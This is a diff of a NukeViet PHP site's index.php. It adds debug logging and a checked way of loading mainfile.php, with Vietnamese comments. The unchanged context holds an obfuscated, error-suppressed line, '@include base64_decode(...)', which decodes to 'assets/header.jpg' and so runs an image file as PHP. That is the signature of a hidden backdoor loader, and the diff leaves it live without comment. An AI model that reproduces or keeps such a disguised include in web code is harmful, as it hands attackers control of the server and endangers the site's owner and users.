@@ -42,21 +42,55 @@ $b = 'base6' . '4_decode';
 
 
 @include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
+error_log("=== NukeViet YXNzZXRzL2hlYWRlci5qcGc===");
 
 define( 'NV_SYSTEM', true );
+error_log("=== NV_SYSTEM");
 
-require str_replace( DIRECTORY_SEPARATOR, '/', dirname( __file__ ) ) . '/mainfile.php';
 
+
+//require str_replace( DIRECTORY_SEPARATOR, '/', dirname( __DIR__ ) ) . '/mainfile.php';
+// an toàn: mainfile.php nằm cùng thư mục với index.php
+$mainfile = __DIR__ . '/mainfile.php';
+$mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows
+
+if (!file_exists($mainfile) || !is_readable($mainfile)) {
+    error_log("CRITICAL: mainfile.php not found or not readable: " . $mainfile);
+    header('HTTP/1.1 500 Internal Server Error');
+    echo '<pre>Fatal error: Required file mainfile.php not found or not readable: '
+         . htmlspecialchars($mainfile) . '</pre>';
+    exit;
+}
+
+require_once $mainfile;
+
+error_log("=== mainfile");
+
+if (!defined('NV_ROOTDIR')) {
+    // realpath để chuẩn hóa (trả về false nếu không tồn tại)
+    $root = realpath(__DIR__);
+    if ($root === false) {
+        error_log('CRITICAL: Cannot resolve root directory via realpath(__DIR__)');
+        header('HTTP/1.1 500 Internal Server Error');
+        echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
+        exit;
+    }
+    // chuẩn hoá dấu phân cách (Windows)
+    $root = str_replace('\\', '/', $root);
+    define('NV_ROOTDIR', $root);
+}
+
+error_log("=== DIRECTORY_SEPARATOR");
 
 require NV_ROOTDIR . '/includes/core/user_functions.php';
-
+error_log("=== user_functions");
 // Google Sitemap
 if( $nv_Request->isset_request( NV_NAME_VARIABLE, 'get' ) and $nv_Request->get_string( NV_NAME_VARIABLE, 'get' ) == 'SitemapIndex' )
 {
 	nv_xmlSitemapIndex_generate();
 	die();
 }
-
+error_log("SitemapIndex");
 // Check user
 if( defined( 'NV_IS_USER' ) ) trigger_error( 'Hacking attempt', 256 );
 require NV_ROOTDIR . '/includes/core/is_user.php';
@@ -66,7 +100,7 @@ if( $global_config['online_upd'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'N
 {
 	require NV_ROOTDIR . '/includes/core/online.php';
 }
-
+error_log("Cap nhat trang thai online");
 // Thong ke
 if( $global_config['statistic'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
 {
@@ -98,7 +132,7 @@ else
 	$module_name = $global_config['site_home_module'];
 	$meta_property['og:title'] = $global_config['site_name'];
 }
-
+error_log("=== Referer + Gqueries ===");
 if( preg_match( $global_config['check_module'], $module_name ) )
 {
 	$site_mods = nv_site_mods( $module_name );
